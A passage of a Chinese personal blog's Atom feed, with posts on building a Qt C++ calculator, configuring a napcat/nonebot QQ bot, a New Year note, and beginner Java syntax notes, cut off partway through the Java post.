<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>猫涅的秘密结社</title>
  <icon>https://www.maonie.top/icon.png</icon>
  <subtitle>嗯..喵?</subtitle>
  <link href="https://www.maonie.top/atom.xml" rel="self"/>
  
  <link href="https://www.maonie.top/"/>
  <updated>2025-04-18T07:02:08.097Z</updated>
  <id>https://www.maonie.top/</id>
  
  <author>
    <name>nirvanafelis</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>qt环境下的c++程序编写</title>
    <link href="https://www.maonie.top/2025/02/27/cpp/"/>
    <id>https://www.maonie.top/2025/02/27/cpp/</id>
    <published>2025-02-27T05:50:02.000Z</published>
    <updated>2025-04-18T07:02:08.097Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>课程讲到了面向对象程序设计(C++)<br>那就根据课程写一些笔记</p><span id="more"></span><h2 id="C-与C"><a href="#C-与C" class="headerlink" title="C++与C"></a>C++与C</h2><p><strong>C++是在C的基础上扩展了面向对象的内容,所以C++完全兼容C</strong></p><p>大学中使用的开发环境是<strong>qt</strong> 非常好用 能很方便的做出一些带ui的程序 这里会自学 并赛一些比较基础的实例上来</p><h2 id="一、基础四则计算器"><a href="#一、基础四则计算器" class="headerlink" title="一、基础四则计算器"></a>一、基础四则计算器</h2><h3 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h3><p><strong>先新建一个项目 文件-新建文件或项目-选择一个模板-Application-Qt Widgets Application-右下角确认选择</strong><br>随后选择项目名称 具体目录 配置好编译文件 就可以开始编写了<br><img src="/1.jpg" alt="1"><br>可以看到系统会默认给我们添加main.cpp、文件名.cpp、 文件名.h和一个.pro项目文件，点击完成，即可创建出一个Qt桌面程序。</p><p>关于这些文件的具体作用我们先按下不表 来看看如何一步步打造自己的计算器吧</p><h3 id="设计计算器ui"><a href="#设计计算器ui" class="headerlink" title="设计计算器ui"></a>设计计算器ui</h3><p>每个计算器程序都会有自己的ui（用户页面）——例如我接下来展示的 微软自带的计算器<br><img src="/2.jpg" alt="2"><br>在编写具体的代码之前 我们需要参考类似的布局 设计出差不多的页面<br><img src="/3.jpg" alt="3"><br><strong>↑程序的最终效果图</strong><br>双击左边项目栏中的ui文件 进入<strong>ui编辑</strong>的页面 可以看到左半边是各种常见的组件 比如按钮 文本框 勾选框之类的 只要在左边选择想要的组件 选中并拖拽到屏幕中央 便可以在你设计的程序里添加相应的内容<br>首先是 <strong>按钮</strong> 既然是计算器 那就肯定要有按钮<br>从左边拖出一个 <strong>push button</strong> 双击更改其上显示的文字 然后在右下角minimumsize和maximumsize处将按钮大小固定为40×40 再次选中该按钮 用 <strong>ctrl+c ctrl+v</strong> 来复制出一样的按钮 其中等于号可以进行微调 设置成90×40的大小<br><img src="/4.jpg" alt="4"><br>排列好大致的位置后 将所有按钮选中 点击上方的 <strong>栅格布局</strong> 按钮 就可以将这些按钮组合起来 调整位置更加方便<br><img src="/5.jpg" alt="5"><br>整个计算器上边的文字框名为组件 <strong>Line edit</strong> 导入方法同理<br>接下来为了方便代码的编写 我们要为每个按钮起一个对应的对象名 点击按钮后在右上角会自动显示 双击来改名<br><img src="/6.jpg" alt="6"><br>整个窗口的大小可以通过代码或者点击整个ui页面的背景 和调整按钮一样调整最大和最小尺寸<br>剩下有一部分可选的调整需要在cpp文件中定义<br><img src="/8.jpg" alt="8"></p><pre class="line-numbers language-none"><code class="language-none">MainWindow::MainWindow(QWidget *parent)    : QMainWindow(parent)    , ui(new Ui::MainWindow)&#123;    ui-&gt;setupUi(this);    this-&gt;setMaximumSize(220,340); &#x2F;&#x2F;窗口最大尺寸    this-&gt;setMinimumSize(220,340); &#x2F;&#x2F;窗口最小尺寸    this-&gt;setWindowTitle(&quot;计算器&quot;); &#x2F;&#x2F;决定窗口标题    QFont f(&quot;微软雅黑&quot;,14); &#x2F;&#x2F;设置字体与字号    ui-&gt;MainLineEdit-&gt;setFont(f); &#x2F;&#x2F;套用字体    ui-&gt;EqualButton-&gt;setStyleSheet(&quot;background:pink&quot;); &#x2F;&#x2F;设置等于号背景为粉色&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="程序编写"><a href="#程序编写" class="headerlink" title="程序编写"></a>程序编写</h3><p>页面已经设计完毕了 接下来我们需要一个程序来让每个按钮实现他应有的功能<br>首先 为了让每个按钮被点击时加入对应的字符 我们需要一个能够盛放对应字符的变量<br>回到编辑页面 在.h头文件里定义一个QString变量 expression 用它来记录整个过程<br><img src="/7.jpg" alt="7"><br>接下来 为了让每个按钮实现对应功能 再次回到设计页面 对相应的按钮右键单击-转到槽- 在跳出的窗口里点击clicked()-ok<br>会自动跳转到相应函数的定义中 编写一段对应代码即可</p><pre class="line-numbers language-none"><code class="language-none">void MainWindow::on_TwoButton_clicked() &#x2F;&#x2F;可能会根据程序和对象名有所不同&#123;    expression +&#x3D; &quot;[对应字符]&quot;; &#x2F;&#x2F;在expression中插入对应的字符    ui-&gt;MainLineEdit-&gt;setText(expression); &#x2F;&#x2F;让文本框中显示expression中的字符&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>依葫芦画瓢 把所有对应的按钮进行编写 <strong>清空 退格 等于</strong> 按钮则需要特殊的定义</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;清空void MainWindow::on_Clear_clicked()&#123;    expression.clear();    ui-&gt;MainLineEdit-&gt;clear();&#125;&#x2F;&#x2F;退格void MainWindow::on_Backspace_clicked()&#123;    expression.chop(1);    ui-&gt;MainLineEdit-&gt;setText(expression);&#125;&#x2F;&#x2F;等于void MainWindow::on_EqualButton_clicked() &#123;    if (expression.isEmpty()) &#123;        ui-&gt;MainLineEdit-&gt;setText(&quot;Error&quot;);        return;    &#125;    QStack&lt;double&gt; s_num;   &#x2F;&#x2F; 改为double以支持浮点    QStack&lt;char&gt; s_opt;    QByteArray ba &#x3D; expression.toUtf8();    const char *opt &#x3D; ba.constData();    int i &#x3D; 0;    double tmp &#x3D; 0;    bool isNum &#x3D; false;    while (opt[i] !&#x3D; &#39;\0&#39; || !s_opt.empty()) &#123;        if (isdigit(opt[i])) &#123;            tmp &#x3D; tmp * 10 + (opt[i] - &#39;0&#39;);            i++;            isNum &#x3D; true;        &#125; else if (opt[i] &#x3D;&#x3D; &#39;.&#39; &amp;&amp; isNum) &#123;            &#x2F;&#x2F; 处理小数部分（需扩展逻辑）            i++;            double fraction &#x3D; 0.1;            while (isdigit(opt[i])) &#123;                tmp +&#x3D; (opt[i] - &#39;0&#39;) * fraction;                fraction *&#x3D; 0.1;                i++;            &#125;        &#125; else &#123;            if (isNum) &#123;                s_num.push(tmp);                tmp &#x3D; 0;                isNum &#x3D; false;            &#125;            &#x2F;&#x2F; 运算符处理逻辑            if (s_opt.empty() || Priority(opt[i]) &gt; Priority(s_opt.top()) ||                (s_opt.top() &#x3D;&#x3D; &#39;(&#39; &amp;&amp; opt[i] !&#x3D; &#39;)&#39;)) &#123;                if (opt[i] !&#x3D; &#39;\0&#39;) &#123;                    s_opt.push(opt[i]);                    i++;                &#125;            &#125; else &#123;                while (!s_opt.empty() &amp;&amp;                      (Priority(opt[i]) &lt;&#x3D; Priority(s_opt.top()) || opt[i] &#x3D;&#x3D; &#39;)&#39;)) &#123;                    char ch &#x3D; s_opt.pop();                    if (ch &#x3D;&#x3D; &#39;(&#39; &amp;&amp; opt[i] &#x3D;&#x3D; &#39;)&#39;) &#123;                        i++;                        break;                    &#125;                    if (s_num.size() &lt; 2) &#123;                        ui-&gt;MainLineEdit-&gt;setText(&quot;Error&quot;);                        return;                    &#125;                    double num2 &#x3D; s_num.pop();                    double num1 &#x3D; s_num.pop();                    switch (ch) &#123;                        case &#39;+&#39;: s_num.push(num1 + num2); break;                        case &#39;-&#39;: s_num.push(num1 - num2); break;                        case &#39;*&#39;: s_num.push(num1 * num2); break;                        case &#39;&#x2F;&#39;:                            if (num2 &#x3D;&#x3D; 0) &#123;                                ui-&gt;MainLineEdit-&gt;setText(&quot;Error: Div 0&quot;);                                return;                            &#125;                            s_num.push(num1 &#x2F; num2);                            break;                    &#125;                &#125;            &#125;        &#125;    &#125;    if (isNum) s_num.push(tmp);  &#x2F;&#x2F; 处理最后一个数字    if (s_num.empty()) &#123;        ui-&gt;MainLineEdit-&gt;setText(&quot;Error&quot;);    &#125; else &#123;        ui-&gt;MainLineEdit-&gt;setText(QString::number(s_num.top()));    &#125;&#125;int MainWindow::Priority(char ch) &#123;    switch(ch) &#123;        case &#39;(&#39;:            return 3;        case &#39;*&#39;:        case &#39;&#x2F;&#39;:            return 2;        case &#39;+&#39;:        case &#39;-&#39;:            return 1;        default:            return 0;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>都设置完之后点击左下角的编译 就可以测试成功运行了</p><p>注:cmd环境下不会显示UTF-8 需要在main函数中预先输入system(“chcp 65001”);</p><h1 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾&#x2F;引用"></a>结尾&#x2F;引用</h1><blockquote><p>We are just another visitor in a transient world.</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;课程讲到了面向对象程序设计(C++)&lt;br&gt;那就根据课程写一些笔记&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="c语言" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/c%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="c语言" scheme="https://www.maonie.top/tags/c%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>新新的年</title>
    <link href="https://www.maonie.top/2025/01/03/%E6%96%B0%E6%96%B0%E7%9A%84%E5%B9%B4/"/>
    <id>https://www.maonie.top/2025/01/03/%E6%96%B0%E6%96%B0%E7%9A%84%E5%B9%B4/</id>
    <published>2025-01-03T07:32:12.000Z</published>
    <updated>2025-01-12T04:25:48.012Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h1><p>新年到了 第一学期结束了 <del>高数也挂了</del><br>还有很多没做的事呢 先继续冲刺了</p></body></html>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="告示" scheme="https://www.maonie.top/categories/%E5%91%8A%E7%A4%BA/"/>
    
    
    <category term="告示" scheme="https://www.maonie.top/tags/%E5%91%8A%E7%A4%BA/"/>
    
  </entry>
  
  <entry>
    <title>qq机器人配置二三事</title>
    <link href="https://www.maonie.top/2024/12/04/qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E9%85%8D%E7%BD%AE%E4%BA%8C%E4%B8%89%E4%BA%8B/"/>
    <id>https://www.maonie.top/2024/12/04/qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E9%85%8D%E7%BD%AE%E4%BA%8C%E4%B8%89%E4%BA%8B/</id>
    <published>2024-12-04T12:31:56.000Z</published>
    <updated>2024-12-06T01:18:46.336Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>看别人整的qq机器人挺有意思 所以自已搭一个玩玩<br>使用了napcat+nonebot的方式</p><p>记录基础安装/配置/踩坑过程 配件安装之后有事也会写在这里</p><span id="more"></span><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>服务器是2核2G 一年份的阿里云服务器  用了学生优惠<br>一开始用的系统镜像是阿里云的Alibaba Cloud Linux 结果有些配置和官方的冲突了 遂作罢 改用Ubuntu</p><p>napcat和nonebot的安装没什么好说的 按照帮助文件运行命令即可<br>python有些全局安装由于安全考虑会不让你装 复制并输入回显中的强制安装选项即可</p><p>整个流程总结来说:<br>创建nonebot-启动napcat-在napcat上登陆想要实现机器人功能的qq-运行nonebot-ws反代配置成功-nonebot连接上napcat-nonebot开始监听napcat传输到的消息-nonebot根据自己的插件/配置做出反应-成功</p><p>创建nonebot时注意是空格选择 enter确认 最好安装自带的<strong>echo</strong>功能 方便测试</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>要让这俩真正联动起效的话 得在napcat中设置反向ws<br>配置有两种方式:<br>1.留意启动日志里的形如 <code>[WebUi] WebUi Local Panel Url: http://127.0.0.1:6099/webui?token=xxxx</code> 的token信息<br>随后访问该网址（注意环境是否开放公网并自主修改ip）进入图形化页面<br>直接复制整个网址应该会自动传参 不用输入token<br>如果因为各种原因错过了token 可以在<code>webui.json</code>里找到 输入即可<img data-src="/2024/12/04/qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E9%85%8D%E7%BD%AE%E4%BA%8C%E4%B8%89%E4%BA%8B/2.jpg" alt="2"><br>网络配置-右上角添加配置<br><img data-src="/2024/12/04/qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E9%85%8D%E7%BD%AE%E4%BA%8C%E4%B8%89%E4%BA%8B/3.jpg" alt="3"></p><pre class="line-numbers language-none"><code class="language-none">名称-不和别的重复就行 随意类型-选最后一个 WebSocket客户端/启用打开url-默认为ws://127.0.0.1:8080/onebot/v11/ws 可能会因为nonebot的配置而变更Token-自定义的验证用密码 设置后需要在nonebot的.env文件中配置相同字段 这里建议配置 因为能有效防止403报错的问题出现//在.env中的配置格式- ONEBOT_ACCESS_TOKEN=[相同密码]剩下的都是可选项 知道是什么的情况下再改<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.直接通过修改安装目录中的<code>./config/onebot11_xxxx.json</code>文件来配置</p><pre class="line-numbers language-none"><code class="language-none">{  "network": {   // WS客户端组/反向WS 可以配置多个 这里演示为一个    "websocketClients": [      {        "name": "WsClient",// 名字不能重复 唯一标识        "enable": false,//启用状态        "url": "ws://localhost:8082",// 上报地址        "messagePostFormat": "array",// 消息上报格式 string/array        "reportSelfMessage": false,// 是否上报自身消息        "reconnectInterval": 5000,// 重连间隔        "token": "",// 鉴权密钥        "debug": false,// raw数据上报        "heartInterval": 30000// 心跳周期      }    ]   },  "musicSignUrl": "",  "enableLocalFile2Url": false,  "parseMultMsg": false}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先是改名和状态改为启用<br>url改为<code>ws://127.0.0.1:8080/onebot/v11/ws</code><br>这里的 <code>8080</code> 是 NoneBot 输出的端口号，<code>/onebot/v11/ws</code> 是 NoneBot onebot 适配器默认的路径<br><img data-src="/2024/12/04/qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E9%85%8D%E7%BD%AE%E4%BA%8C%E4%B8%89%E4%BA%8B/1.jpg" alt="1"><br>一般来说跳出这后三行 提示ws反代已成功连接 就没啥问题了<br>假如重复报403 那就是TOKEN的问题 需要另外设置 方法如上</p><p>测试的时候可以使用自带的echo功能 在群聊或者私聊输入（群聊里还需要@机器人） /echo [想让机器人说的话] 若成功回复则为成功<br>接下来去nonebot商店里找点插件自己安装吧</p><h2 id="插件（先摸了）"><a href="#插件（先摸了）" class="headerlink" title="插件（先摸了）"></a>插件（先摸了）</h2><h1 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾/引用"></a>结尾/引用</h1><blockquote><p>We are just another visitor in a transient world</p></blockquote><p><a href="https://napneko.pages.dev/">napcat安装文档</a><br><a href="https://nonebot.dev/">nonebot安装文档</a></p></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;看别人整的qq机器人挺有意思 所以自已搭一个玩玩&lt;br&gt;使用了napcat+nonebot的方式&lt;/p&gt;
&lt;p&gt;记录基础安装&amp;#x2F;配置&amp;#x2F;踩坑过程 配件安装之后有事也会写在这里&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="linux" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/linux/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="linux" scheme="https://www.maonie.top/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>搞点java</title>
    <link href="https://www.maonie.top/2024/11/23/%E6%90%9E%E7%82%B9java/"/>
    <id>https://www.maonie.top/2024/11/23/%E6%90%9E%E7%82%B9java/</id>
    <published>2024-11-23T08:00:45.000Z</published>
    <updated>2024-11-29T13:27:44.393Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>不多说了 接触点新的语言 指不定用得上呢<br>环境为windows11 java17</p><p><a href="https://www.bilibili.com/video/BV1994y1r7uV">跳转</a><br>顺便做个学习记录吧<br><strong>11/23</strong> 17:30 p24完成 19:30 p25完成<br><strong>11/24</strong> 17:00 p26完成 17:30 p27完成<br><strong>11/25</strong> p28完成 p29完成 p30完成<br><strong>11/26</strong> p31完成 p32完成 p33完成 p34完成 p35完成 p36完成<br>p38 p39是教你下软件 这里用idea代替<br>p40 跳过<br><strong>11/27</strong> p41完成 看p51  到p56<br><strong>11/28</strong> p56完成  p57完成-p65完成<br><strong>11/29</strong>  p66完成  p67完成 p68完成-p76-p79完成 p80完成<br>最近学的有点多了 得消化消化 先转移一下注意力吧                                                                                                                                </p><p>ps:大学竟然今后只学c++ 这下白搭了</p><span id="more"></span><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>请注意java为<strong>大小写敏感</strong>的强类型语言（每个值的数据类型都不能随意变更）<br><strong>javac编译的时候加上 <code>-encoding utf-8</code> 不然程序不认中文</strong></p><h2 id="helloworld程序"><a href="#helloworld程序" class="headerlink" title="helloworld程序"></a>helloworld程序</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java">public class HelloWorld{    public static void main(String[] args) {        System.out.print("hello world");    }}//public所修饰的class必须与文件名保持一致 且一个java文件可以存在多个class 但编译后会分开/*多行注释*//**文档注释-用于自动生成帮助文件/在编译环境中生成简介命令 javadoc -encoding utf-8 类名 （-d可指定输出目录）可以生成一系列帮助文件*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（windows系统需要提前配置环境变量）编译运行过程:<br>打开cmd 同目录下输入 <code>javac 文件名.java</code><br>会出现一个.class文件 随后运行<code>java 文件名</code>即可运行程序<br><code>System.out.print为直接输出 System.out.println会在输出后自己换行</code></p><h2 id="变量定义-赋值"><a href="#变量定义-赋值" class="headerlink" title="变量定义&amp;赋值"></a>变量定义&amp;赋值</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java">public class output{    public static void main(String[] args) {        int money;        money = 100;        System.out.println(money);    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="定量名需要注意的几个点"><a href="#定量名需要注意的几个点" class="headerlink" title="定量名需要注意的几个点"></a>定量名需要注意的几个点</h2><p>1.不能以数字开头 可以包含数字 字母 下划线<code>_</code> 货币符号<br>2.不能和关键字 保留字重名 不能是 true false null</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>分为<strong>基本数据类型</strong> 和 <strong>引用数据类型</strong><br>基本数据类型分为整数 小数 布尔 字符</p><p><strong>整数</strong>分为byte short int long（默认运算时为int 若需要为long类型赋值较大整数时 需要在数的后面加“L”）<br>分别占用1 2 4 8字节<br>二进制取值范围为2的7次方 15次方 31次方 63次方 </p><p><strong>小数</strong>分为float double（默认为double 若需要为float型赋值时 需要在数的后面加“F”）<br>分别占用4 8字节</p><p><strong>布尔类型</strong>boolean占用4字节 取值为true(真)或者false(假)</p><p><strong>字符类型</strong>只有个char 占2字节 取值范围0-65535<br>赋值的时候可以直接用单引号加字符 也可以用整数或进制</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">char c1 = 'A';char c2 = 65;char c3 = '\u00041';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在一些特殊情况下 使用转义字符</p><pre class="line-numbers language-none"><code class="language-none">\n 换行\t 缩进\\ 反斜线\' 单引号\" 双引号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>引用数据类型分为字符串 数组 对象</p><p><strong>字符串类型</strong>只有string 可以表示一串的字符</p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p>自动类型转换：</p><ul><li>两种类型互相兼容</li><li>目标类型<strong>大于</strong>源类型</li></ul><p>强制类型转换：</p><ul><li>两种类型互相兼容</li><li>目标类型<strong>小于</strong>源类型</li></ul><p>例:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">自动转换public class HelloWorld{    public static void main(String[] args) {    short s =123;int i = s;//转换成功    }}强制转换public class HelloWorld{    public static void main(String[] args) {    short s =123;byte b = s;//转换失败    }}public class HelloWorld{    public static void main(String[] args) {    short s =123;byte b = (byte)s;//转换成功    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>强制转换可能会导致数据截断——整数长度不够的话会根据二进制安排一个不同的数 小数转整数会失去精度</p><h2 id="自动数据转换"><a href="#自动数据转换" class="headerlink" title="自动数据转换"></a>自动数据转换</h2><p><img data-src="/1.jpg" alt="1"><br>输出数据的时候也可以利用加号来达到类似c语言中占位符的效果<br>例：<code> int a=1;  System.out.println("a="+a);</code><br>输出结果就会是a=1</p><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>就是使两个数之间进行计算的符号</p><table><thead><tr><th align="center">操作符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">+</td><td align="center">加、求和</td></tr><tr><td align="center">-</td><td align="center">减、求差</td></tr><tr><td align="center">*</td><td align="center">乘、求积</td></tr><tr><td align="center">/</td><td align="center">除、求商</td></tr><tr><td align="center">%</td><td align="center">模、求余</td></tr></tbody></table><p>还有俩<strong>一元运算符</strong>（只需要一个操作数的运算符）</p><table><thead><tr><th align="center">操作符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">++</td><td align="center">递增、变量值+1</td></tr><tr><td align="center">–</td><td align="center">递减、变量值-1</td></tr></tbody></table><p>输出的时候为防止字符串优先级过高 可以使用括号<br>想要输出小数可以用(double)转数据类型<br>报错的小差分——整形除以0会抛异常说不能除以0<br>浮点除以0会说结果无限大（因为0是无限小）<br>0除以0会返回NaN<br><strong>++和–在变量的前面/后面 运行结果会有所不同</strong></p><pre class="line-numbers language-none"><code class="language-none">当++、--运算符前置的时候，返回自加/自减后的值当++、--运算符后置的时候，返回自加/自减前的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><table><thead><tr><th>操作符</th><th>描述</th></tr></thead><tbody><tr><td>=</td><td>直接赋值</td></tr><tr><td>+=</td><td>求和后赋值</td></tr><tr><td>-=</td><td>求差后赋值</td></tr><tr><td>*=</td><td>求积后赋值</td></tr><tr><td>/=</td><td>求商后赋值</td></tr><tr><td>%=</td><td>求模后赋值</td></tr></tbody></table><p><code>a+=b ----&gt; a=a+b</code>(理论来说是相同的 但一元和二元运算符有区别 后面会说)</p><h2 id="例题：交换两个变量的值"><a href="#例题：交换两个变量的值" class="headerlink" title="例题：交换两个变量的值"></a>例题：交换两个变量的值</h2><p>有两种方式 引入一个新的空变量 或者利用逆运算和赋值</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">//方法一 引入空变量public class Main {public static void main(String[] args) {        int a = 8;        int b = 10;        int temp;        temp = a; //将a的值存入temp中        a = b; //将a的值变为b        b = temp; //将temp中存储的a值放入b}}//方法二 利用逆运算public class Main {public static void main(String[] args) {        int a = 8;        int b = 10;        a = a + b; //a赋值为a与b的和        b = a - b; //让b从两者之和中减去自身 得到a的值        a = a - b; //a从两者之和中再减去现在的b 得到b的值 }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="至于一元-二元运算符之间的区别"><a href="#至于一元-二元运算符之间的区别" class="headerlink" title="至于一元/二元运算符之间的区别"></a>至于一元/二元运算符之间的区别</h2><p>一元运算符在运算时会使后者的数值进行隐式转换 与前者保持相同<br>而二元运算符则会按照前文讲过的规律自动转换数据 不注意会引发报错<br><img data-src="/2.jpg" alt="2"><br>(前者触发了将short强制转换成int的错误 而后者会隐式转换 没有问题) </p><h2 id="其他运算符"><a href="#其他运算符" class="headerlink" title="其他运算符"></a>其他运算符</h2><p><strong>关系运算符:两个操作数进行比较</strong></p><table><thead><tr><th align="center">操作符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&gt;</td><td align="center">大于</td></tr><tr><td align="center">&lt;</td><td align="center">小于</td></tr><tr><td align="center">&gt;=</td><td align="center">大于等于</td></tr><tr><td align="center">&lt;=</td><td align="center">小于等于</td></tr><tr><td align="center">==</td><td align="center">等于</td></tr><tr><td align="center">!=</td><td align="center">不等于</td></tr></tbody></table><p>这些返回的都是布尔值 true 或 false</p><p><strong>逻辑运算符:两个布尔类型的操作数或表达式进行逻辑比较</strong></p><table><thead><tr><th>操作符</th><th>语义</th><th>描述</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>与（并且）</td><td>两个操作数，同时为真，结果为真</td></tr><tr><td>||</td><td>或（或者）</td><td>两个操作数，有一个为真，结果为真</td></tr><tr><td>！</td><td>非（取反）</td><td>意为“不是”，真就是假，假就是真</td></tr></tbody></table><p><strong>小知识-短路与</strong>:<br>在判断与的语句中 系统为了缩减所需时间<br>当前面任意一项为假导致结果为假时 会直接掐断判断的过程 让后半段不被运行<br>例:</p><pre class="line-numbers language-none"><code class="language-none">int a = 8,b = 10;System.out.println(a&gt;9 &amp;&amp; b++==10);System.out.println(b);由于前者a&gt;9为假 b++的过程被直接掐断 导致b输出出来依旧是10按位与(&amp;)不会有短路机制 一路触发运行相同的 ||（或）也分短路或和按位或（|）的区别 具体逻辑同上<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>三元运算符:将判断后的结果赋值给变量</strong></p><table><thead><tr><th>操作符</th><th>语义</th><th>描述</th></tr></thead><tbody><tr><td>? :</td><td>布尔表达式?结果一:结果二</td><td>当表达式结果为真，获得结果一<br>当表达式结果为假，获得结果二</td></tr></tbody></table><h2 id="运算符的优先级"><a href="#运算符的优先级" class="headerlink" title="运算符的优先级"></a>运算符的优先级</h2><p>括号优先<br>算数&gt;关系&gt;赋值<br>例: (<code>d=a+b&gt;c</code>)中优先计算a+b 后将a+b的值与c作比较 随后将布尔值赋予d<br>然后是先乘除后加减 逻辑运算中 非(!) 优先于 与(&amp;&amp;) 优先于或(||)</p><h2 id="控制台输入"><a href="#控制台输入" class="headerlink" 